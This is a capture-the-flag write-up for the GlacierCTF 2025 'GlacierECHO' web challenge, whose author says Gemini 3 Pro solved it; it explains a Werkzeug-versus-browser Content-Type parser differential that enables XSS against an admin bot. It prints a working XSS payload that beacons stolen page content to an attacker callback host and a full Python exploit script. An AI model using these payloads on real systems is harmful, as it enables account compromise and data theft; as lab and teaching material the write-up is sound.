# Disclaimer
I did an experiment of trying to solve this challenge with the help of new Gemini 3 Pro model (using `gemini-cli`). **It succeeded to solve it completely on its own.** 

Despite the fact, that I didn't really solve this challenge with my brain and hands, I still decided to post this writeup here to showcase the capabilities of modern LLM models in context of CTF challenges solving. That's an interesting era we live in (definitely hard for CTF creators, though :D). Aside from that, I still find challenge and solution interesting and having educational value.

# ❄️ GlacierECHO (369 points) (28 solves)

**CTF:** GlacierCTF 2025  
**Category:** Web  
**Technique:** Parser Differential, XSS, Content-Type Injection

## 📝 Introduction

GlacierECHO is a web challenge featuring a "monitoring system" that allows research stations (users) to send echo messages. The core functionality echoes back user input with a user-defined `Content-Type`. The application claims to restrict this content type strictly to `text/plain` to prevent Cross-Site Scripting (XSS).

However, a discrepancy between how the Python library (`Werkzeug`) parses headers and how web browsers interpret them allows an attacker to bypass this restriction, execute arbitrary JavaScript in the context of an administrator bot, and steal the flag.

## 🔍 Reconnaissance & Analysis

### The Tech Stack
- **Framework:** Django (Python)
- **WSGI Utility:** Werkzeug
- **Task Queue:** Redis & RQ
- **Bot:** Playwright (Chromium)

### The Vulnerable Code
In `glacierecho/web/echo/views.py`, the `echo` function handles the request:

```python
@csrf_exempt
def echo(request):
    # ... authentication checks ...

    content_type = request.GET.get("type", "text/plain")
    parsed_type = parse_options_header(content_type)[0]

    # Security Check
    if parsed_type != "text/plain":
        return HttpResponse("Error: Only text/plain are allowed!", status=403)

    message = request.GET.get("message", "")
    
    # ... save to database ...

    response = HttpResponse(message)
    response["Content-Type"] = content_type
    return response
```

The application uses `werkzeug.http.parse_options_header` to extract the MIME type. It strictly checks that the base MIME type is `text/plain`. If valid, it reflects the **original, raw** `content_type` string back in the response header.

## 💥 The Vulnerability: Parser Differential

The security relies entirely on `parse_options_header` behaving exactly like a web browser. This is a classic "Parser Differential" vulnerability.

### Werkzeug's View
I tested Werkzeug's parsing logic locally:

```python
from werkzeug.http import parse_options_header

# Payload
ct = "text/plain;a=b,text/html"
parsed, options = parse_options_header(ct)

print(parsed) 
# Output: 'text/plain'
```

Werkzeug sees the comma `,` as part of the parameters or a separator it handles gracefully, stopping the main MIME type parsing at `text/plain`. It considers `text/html` as garbage or an ignored parameter value. The check `parsed_type == "text/plain"` **passes**.

### The Browser's View
When a browser receives the header:
`Content-Type: text/plain;a=b,text/html`

It sees two potential MIME types or a malformed list. Chrome/Chromium often prioritizes the seemingly "more specific" or last type, or treats the comma as a delimiter for multiple headers (HTTP Parameter Pollution style). In this specific configuration, Chromium interprets this as `text/html`.

**Result:** The server thinks it's sending text. The browser thinks it's receiving HTML. This enables XSS.

## ⚔️ Exploitation

### 1. The Setup
To exploit this, we need to:
1.  Register a user (to access the echo endpoint).
2.  Craft a URL that injects our XSS payload.
3.  Report this URL to the admin bot via `/report`.
4.  The bot (logged in as Superuser) visits the link, executes our JS, and sends us the flag.

### 2. The Payload Constraints
I faced several hurdles while developing the payload:
*   **Space Truncation:** Spaces in the `Content-Type` header sometimes caused parsing issues or were stripped.
*   **Encoding Issues:** The `message` parameter is part of a GET request. Standard URL encoding of `+` (plus sign) becomes a space on the server side. If we wrote `var flag = a + b`, it might arrive as `var flag = a b`, resulting in a JavaScript syntax error.

### 3. The Final JavaScript Payload
I designed a payload that fetches the protected `/control-center` page (where the flag resides), extracts the flag using Regex, and beacons it back to our server.

To avoid syntax errors with `+`, I used `.concat()`:

```javascript
<script>
var cb = "http://attacker-ip:port";

fetch("/control-center")
.then(r => r.text())
.then(t => {
    // Regex to find gctf{...}
    var match = t.match(/gctf\{[^}]*}/);
    if (match) {
        // Use concat instead of + to be safe against URL decoding weirdness
        fetch(cb.concat("/?flag=").concat(encodeURIComponent(match[0])));
    } else {
        fetch(cb.concat("/?noflag=true"));
    }
})
.catch(e => {
    fetch(cb.concat("/?error=").concat(encodeURIComponent(e.toString())));
});
</script>
```

### 4. Attack Execution
The Python script `exploit.py` automates the process:
1.  Registers a random user.
2.  Logins to establish a session.
3.  Sends the `echo` request with `type=text/plain;a=b,text/html` and the JS payload.
4.  Retrieves the ID of the created echo.
5.  Sends the ID to `/report`.
6.  The Admin Bot visits the XSS link, fetches the flag, and hits our listener.

## 🎓 Educational Takeaways

1.  **Don't Trust Parsers to Align:** Never assume a library's parser (like Werkzeug) interprets data exactly the same way a downstream consumer (like a Browser or a Proxy) will. This discrepancy is the root of many HTTP desync and injection attacks.
2.  **Strict Validation:** Instead of trying to parse and validate a complex string ("Allow text/plain with any parameters"), enforce a strict allowlist ("Allow EXACTLY 'text/plain' and nothing else").
3.  **Content-Type Sniffing:** Browsers are aggressive about guessing content types. Setting `X-Content-Type-Options: nosniff` helps, but if the attacker can inject `text/html` into the header itself, the browser is just obeying the header.
4.  **Blind XSS Debugging:** When exploiting blind XSS (where you can't see the output), use `navigator.sendBeacon` or simple `fetch` calls to report back "checkpoints" (e.g., "Script started", "Fetch success", "Regex matched") to debug where your payload is failing.

## 🐍 Exploit
```python
import requests
import re
import random
import string
import time
import argparse

# Configuration
# For local docker: http://web:8004 (must be reachable from bot container)
# For remote: Your public callback URL (e.g., webhook.site or VPS IP)
DEFAULT_CALLBACK = "http://web:8004" 
DEFAULT_BASE_URL = "http://localhost:1337"

parser = argparse.ArgumentParser(description='GlacierECHO Exploit')
parser.add_argument('--url', default=DEFAULT_BASE_URL, help='Base URL of the challenge')
parser.add_argument('--callback', default=DEFAULT_CALLBACK, help='Callback URL for exfiltration')
args = parser.parse_args()

base_url = args.url.rstrip('/')
callback_url = args.callback.rstrip('/')

print(f"Target: {base_url}")
print(f"Callback: {callback_url}")

def get_csrf(text):
    match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', text)
    if match:
        return match.group(1)
    return None

def random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

username = random_string()
print(f"Registering user: {username}")

s = requests.Session()

# 1. Register
r = s.get(f"{base_url}/register")
csrf_token = get_csrf(r.text)

headers = {
    "Referer": f"{base_url}/register",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "csrfmiddlewaretoken": csrf_token,
    "station_id": username,
    "station_name": "Attacker",
    "location": "DarkSide",
    "password": "Password1!"
}
s.post(f"{base_url}/register", data=data, headers=headers)

# 2. Login (Implicit usually, but let's ensure)
r = s.get(f"{base_url}/login")
if "logout" not in r.text:
    print("Logging in...")
    csrf_token = get_csrf(r.text)
    data = {
        "username": username,
        "password": "Password1!",
        "csrfmiddlewaretoken": csrf_token
    }
    s.post(f"{base_url}/login", data=data, headers={"Referer": f"{base_url}/login"})

# 3. Create Malicious Echo
# Vulnerability: Content-Type injection. 
# 'text/plain;a=b,text/html' bypasses Werkzeug check but renders as HTML in Chrome.
ct = 'text/plain;a=b,text/html'
print(f"Injecting payload with Content-Type: {ct}")

# Payload:
# - Fetch /control-center (admin panel)
# - Extract flag
# - Send to callback
# NOTE: Use 'concat' instead of '+' to avoid URL decoding issues in the 'message' parameter.
payload_script = f"""
<script>
var cb = "{callback_url}";
fetch("/control-center")
.then(r => r.text())
.then(t => {{
    var match = t.match(/gctf\{{[^}}]*}}/);
    if (match) {{
        fetch(cb.concat("/?flag=").concat(encodeURIComponent(match[0])));
    }} else {{
        fetch(cb.concat("/?noflag=true"));
    }}
}})
.catch(e => {{
    fetch(cb.concat("/?error=").concat(encodeURIComponent(e.toString())));
}});
</script>
"""

r = s.get(f"{base_url}/echo", params={"message": payload_script, "type": ct})
print(f"Echo creation status: {r.status_code}")

if r.status_code == 200:
    # 4. Find Echo ID
    # Since we just created it, it should be at the top of our history.
    r_idx = s.get(f"{base_url}/")
    ids = re.findall(r'onclick="reportEcho\((\d+),', r_idx.text)
    if ids:
        echo_id = ids[0]
        print(f"Found Echo ID: {echo_id}")
        
        # 5. Report to Admin
        print("Reporting to admin...")
        # Note: report endpoint is @csrf_exempt
        r = s.post(f"{base_url}/report", data={"echo_id": echo_id})
        print(f"Report status: {r.status_code}")
        print("Attack executed. Check your callback server logs for the flag.")
    else:
        print("Could not find Echo ID in history.")
else:
    print("Failed to create echo.")
print(f"Echo status: {r.status_code}")

if r.status_code == 200:
    r = s.get(f"{base_url}/", headers=headers)
    ids = re.findall(r'onclick="reportEcho\((\d+),', r.text)
    if ids:
        echo_id = ids[0]
        print(f"Echo ID: {echo_id}")
        r = s.post(f"{base_url}/report", data={"echo_id": echo_id}, headers=headers)
        print(f"Report status: {r.status_code}")
        time.sleep(5)

# Loop handles requests
pass
```

## 🚩 Flag
`gctf{183A876Z_3verY0nE_L0v3333s_C00k!3s_847AHZ01}`
